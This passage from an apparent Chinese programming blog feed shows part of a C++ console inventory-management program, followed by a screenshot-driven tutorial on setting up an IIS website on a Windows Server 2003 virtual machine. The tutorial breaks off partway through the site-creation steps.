class="string">&quot;对不起，库存中没有这种商品!!!&quot;</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//按商品价格查询</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mana::select_price</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t按商品价格查询 : &quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t输入价格 : &quot;</span>;</span><br><span class="line"><span class="keyword">double</span> price;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; price;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> name1;<span class="comment">//商品名</span></span><br><span class="line"><span class="keyword">double</span> price1;<span class="comment">//价格</span></span><br><span class="line"><span class="built_in">string</span> storeNo1;<span class="comment">//仓库编号</span></span><br><span class="line"><span class="built_in">string</span> kinds1;<span class="comment">//生产产地</span></span><br><span class="line"><span class="built_in">string</span> shelfNo1;<span class="comment">//货架号</span></span><br><span class="line"><span class="keyword">long</span> count1 = <span class="number">0</span>; <span class="comment">//商品数量</span></span><br><span class="line"></span><br><span class="line"><span class="function">ifstream <span class="title">storeFile</span><span class="params">(<span class="string">&quot;m0re.txt&quot;</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (!storeFile)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t对不起，你的库存为空!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;商品名 &quot;</span> &lt;&lt; <span class="string">&quot;价格 &quot;</span> &lt;&lt; <span class="string">&quot;商品数量 &quot;</span> &lt;&lt; <span class="string">&quot;仓库编号 &quot;</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;生产产地 &quot;</span> &lt;&lt; <span class="string">&quot;货架号&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">while</span> (storeFile &gt;&gt; name1 &gt;&gt; price1 &gt;&gt; count1 &gt;&gt; storeNo1 &gt;&gt; kinds1 &gt;&gt; shelfNo1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (price1 == price)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; setiosflags(ios::left) &lt;&lt; setw(<span class="number">15</span>) &lt;&lt; name1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; setw(<span class="number">10</span>) &lt;&lt; price1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; setw(<span class="number">10</span>) &lt;&lt; count1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; setw(<span class="number">10</span>) &lt;&lt; storeNo1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; setw(<span class="number">15</span>) &lt;&lt; kinds1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; shelfNo1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">storeFile.close();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!flag)</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;对不起，库存中没有这个价格的商品!!!&quot;</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//按产地查询</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mana::select_kind</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t按生产产地查询 : &quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t输入产地名 : &quot;</span>;</span><br><span class="line"><span class="built_in">string</span> kinds;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; kinds;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> name1;<span class="comment">//商品名</span></span><br><span class="line"><span class="keyword">double</span> price1;<span class="comment">//价格</span></span><br><span class="line"><span class="built_in">string</span> storeNo1;<span class="comment">//仓库编号</span></span><br><span class="line"><span class="built_in">string</span> kinds1;<span class="comment">//生产产地</span></span><br><span class="line"><span class="built_in">string</span> shelfNo1;<span class="comment">//货架号</span></span><br><span class="line"><span class="keyword">long</span> count1 = <span class="number">0</span>; <span class="comment">//商品数量</span></span><br><span class="line"></span><br><span class="line"><span class="function">ifstream <span class="title">storeFile</span><span class="params">(<span class="string">&quot;m0re.txt&quot;</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (!storeFile)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t对不起，你的库存为空!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;商品名 &quot;</span> &lt;&lt; <span class="string">&quot;价格 &quot;</span> &lt;&lt; <span class="string">&quot;商品数量 &quot;</span> &lt;&lt; <span class="string">&quot;仓库编号 &quot;</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;生产产地 &quot;</span> &lt;&lt; <span class="string">&quot;货架号&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">while</span> (storeFile &gt;&gt; name1 &gt;&gt; price1 &gt;&gt; count1 &gt;&gt; storeNo1 &gt;&gt; kinds1 &gt;&gt; shelfNo1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (kinds1 == kinds)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; setiosflags(ios::left) &lt;&lt; setw(<span class="number">15</span>) &lt;&lt; name1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; setw(<span class="number">10</span>) &lt;&lt; price1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; setw(<span class="number">10</span>) &lt;&lt; count1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; setw(<span class="number">10</span>) &lt;&lt; storeNo1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; setw(<span class="number">15</span>) &lt;&lt; kinds1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; shelfNo1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">storeFile.close();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!flag)</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;对不起，库存中没有这类商品!!!&quot;</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//商品报损</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mana::call_break</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> name;<span class="comment">//商品名</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t商品报损，请输入要报损商品信息 : &quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t商品名称 : &quot;</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line"></span><br><span class="line"><span class="function">ifstream <span class="title">storeFile</span><span class="params">(<span class="string">&quot;m0re.txt&quot;</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (!storeFile)</span><br><span class="line">&#123;</span><br><span class="line"><span class="function">ofstream <span class="title">storeFile1</span><span class="params">(<span class="string">&quot;m0re.txt&quot;</span>)</span></span>;</span><br><span class="line">storeFile1.close();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t仓存为空!!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="built_in">string</span> name1;<span class="comment">//商品名</span></span><br><span class="line"><span class="keyword">double</span> price1;<span class="comment">//价格</span></span><br><span class="line"><span class="built_in">string</span> kinds1;<span class="comment">//生产产地</span></span><br><span class="line"><span class="built_in">string</span> shelfNo1;<span class="comment">//货架号</span></span><br><span class="line"><span class="keyword">long</span> count1 = <span class="number">0</span>; <span class="comment">//商品数量</span></span><br><span class="line"></span><br><span class="line"><span class="function">ofstream <span class="title">tempFile</span><span class="params">(<span class="string">&quot;j4y.txt&quot;</span>)</span></span>;</span><br><span class="line"><span class="built_in">string</span> storeNo1;<span class="comment">//仓库编号</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;你想报损商品信息如下 : &quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;商品名 &quot;</span> &lt;&lt; <span class="string">&quot;价格 &quot;</span> &lt;&lt; <span class="string">&quot;商品数量 &quot;</span> &lt;&lt; <span class="string">&quot;仓库编号 &quot;</span></span><br><span class="line">&lt;&lt; <span class="string">&quot;生产产地 &quot;</span> &lt;&lt; <span class="string">&quot;货架号&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">while</span> (storeFile &gt;&gt; name1 &gt;&gt; price1 &gt;&gt; count1 &gt;&gt; storeNo1 &gt;&gt; kinds1 &gt;&gt; shelfNo1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (name1==name)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; setiosflags(ios::left) &lt;&lt; setw(<span class="number">15</span>) &lt;&lt; name1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; setw(<span class="number">10</span>) &lt;&lt; price1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; setw(<span class="number">10</span>) &lt;&lt; count1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; setw(<span class="number">10</span>) &lt;&lt; storeNo1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; setw(<span class="number">15</span>) &lt;&lt; kinds1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; shelfNo1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">shelfNo1 += <span class="string">&quot;(损坏)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">tempFile &lt;&lt; setiosflags(ios::left) &lt;&lt; setw(<span class="number">20</span>) &lt;&lt; name1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; setw(<span class="number">15</span>) &lt;&lt; price1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; setw(<span class="number">10</span>) &lt;&lt; count1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; setw(<span class="number">10</span>) &lt;&lt; storeNo1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; setw(<span class="number">20</span>) &lt;&lt; kinds1 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">&lt;&lt; shelfNo1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">tempFile.close();</span><br><span class="line">storeFile.close();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;对不起，仓库中没有这种商品!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ofstream <span class="title">storeFile1</span><span class="params">(<span class="string">&quot;m0re.txt&quot;</span>)</span></span>;</span><br><span class="line"><span class="function">ifstream <span class="title">tempFile1</span><span class="params">(<span class="string">&quot;j4y.txt&quot;</span>)</span></span>;</span><br><span class="line">storeFile1 &lt;&lt; tempFile1.rdbuf();</span><br><span class="line">storeFile1.close();</span><br><span class="line">tempFile1.close();</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;这些商品已经损坏，请尽快从仓库中取出!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;报损成功，记录已经更改!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> select;</span><br><span class="line">mana men;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (select = men.first_face())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (select)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line"></span><br><span class="line">men.in_storage();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line"></span><br><span class="line">men.out_storage();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line"></span><br><span class="line">men.select_ele();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line"></span><br><span class="line">men.call_break();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; <span class="string">&quot;谢谢使用!!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\t\t&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还可以<a href="https://github.com/zxcv0221/m0re">点击这里</a>打包带走<br>演示图<br><img src="https://img-blog.csdnimg.cn/20200610193144931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p>]]></content>
      
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一篇文章学会独立在win2003虚拟机上搭建网站</title>
      <link href="/2020/08/23/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%AD%A6%E4%BC%9A%E7%8B%AC%E7%AB%8B%E5%9C%A8Win%20%20server%202003%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/"/>
      <url>/2020/08/23/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%AD%A6%E4%BC%9A%E7%8B%AC%E7%AB%8B%E5%9C%A8Win%20%20server%202003%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p>本文学习：在Windows server 2003 虚拟机上的服务器搭建一个网站，非常详细，我都会了真的，有手就行。<br><code>Windows+iis+asp+access</code><br>环境：一台windows server 2003虚拟机。<br>准备工作什么也没有，开始搭建</p><h2 id="开始测试搭建"><a href="#开始测试搭建" class="headerlink" title="开始测试搭建"></a>开始测试搭建</h2><p>打开虚拟机，<br>1.点击开始<br><img src="https://img-blog.csdnimg.cn/20200428133927923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>2.点击“管理您的服务器”<br><img src="https://img-blog.csdnimg.cn/20200428134049719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>3.点击“添加或删除角色”<br><img src="https://img-blog.csdnimg.cn/2020042813412035.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>4.出现预备步骤，直接点击下一步<br>等待配置<br><img src="https://img-blog.csdnimg.cn/20200428134152520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>5.配置结束后，点击“自定义配置”，下一步<br><img src="https://img-blog.csdnimg.cn/20200428134300902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>6.选择第三个“应用程序服务器”，下一步<br><img src="https://img-blog.csdnimg.cn/2020042813433586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>7.两个都勾选上，下一步<br><img src="https://img-blog.csdnimg.cn/20200428134408196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>8.直接下一步！<br>9.等待配置组件<br><img src="https://img-blog.csdnimg.cn/20200428134441898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>10.配置成功。出现下图页面，点击完成。<br><img src="https://img-blog.csdnimg.cn/20200428135115412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>11.点关闭页面，点击“开始菜单”——点击“管理工具”——点击第一项“Internet”。<br><img src="https://img-blog.csdnimg.cn/20200428135238462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>12.打开后出现<br><img src="https://img-blog.csdnimg.cn/20200428135710359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>13.右键单击“默认网站”——点击“打开”<br><img src="https://img-blog.csdnimg.cn/20200428135843343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>14.选择全部文件，删除<br><img src="https://img-blog.csdnimg.cn/20200428135938220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>15.右键单击——新建——文本文件，文件名为<code>index.html</code><br><img src="https://img-blog.csdnimg.cn/20200428140131739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>16.右键单击这个文件，选择编辑<br>编辑一段文字即可(内容随意)。</p><p>17.右键单击默认网站——选择权限</p><p>18.点击添加</p><p><img src="https://img-blog.csdnimg.cn/20200428140809433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>19.选择高级<br><img src="https://img-blog.csdnimg.cn/20200428140944173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>20.点击 “立即查找”——在下面找到“Everyone”<br><img src="https://img-blog.csdnimg.cn/20200428141053516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>21.选好之后点击确定，再点击确定。(点两次)<br>选择完全控制，点击允许(因为是测试，所以可以设置成这样)，点击确定<br><img src="https://img-blog.csdnimg.cn/20200428141457929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>22.右键单击默认网站，选择“属性”，点开后，找到“文档”打开，按照下图一步一步做，(默认内容文档全部删除)<br><img src="https://img-blog.csdnimg.cn/20200428142138492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><p>23.点击添加，将自己编写的<code>index.html</code>写上，点击确定，再次确定。<br><img src="https://img-blog.csdnimg.cn/20200428142037205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>24.回到桌面，点击打开浏览器，<br><img src="https://img-blog.csdnimg.cn/2020042814264447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>25.输入<code>127.0.0.1</code>或者加上http(无所谓的)，就可以看到在<code>index.html</code>里写的内容了。<br><img src="https://img-blog.csdnimg.cn/20200428142827851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>测试成功，下面开始搭建网站。<br>1.网站——新建——网站</p><p><img src="https://img-blog.csdnimg.cn/20200428143929671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>2.点击下一步</p><p><img src="https://img-blog.csdnimg.cn/20200428144009668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>3.描述可随意，点击下一步<br><img src="https://img-blog.csdnimg.cn/20200428144058511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>4.直接点击下一步<br><img src="https://img-blog.csdnimg.cn/20200428144149205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>补充知识：IP分配就是配置服务器的IP，别人可以通过本机(服务器)的IP地址，可以访问我们的网站。端口分配的话， 我在啃书的栏目中第一口。有对端口的理解，这里不再重复。这里不需要修改，想改动，后面也可以更改。<br>5.路径选择，浏览，选择C盘下的，<code>Inetput</code>文件夹下的<code>wwwroot</code>文件夹，点击确定。点击下一步<br><img src="https://img-blog.csdnimg.cn/20200428144752168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>6.点击下一步，因为访问网站的用户，我们就让他可读就行。<br><img src="https://img-blog.csdnimg.cn/20200428144947130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>7.点击完成<br><img 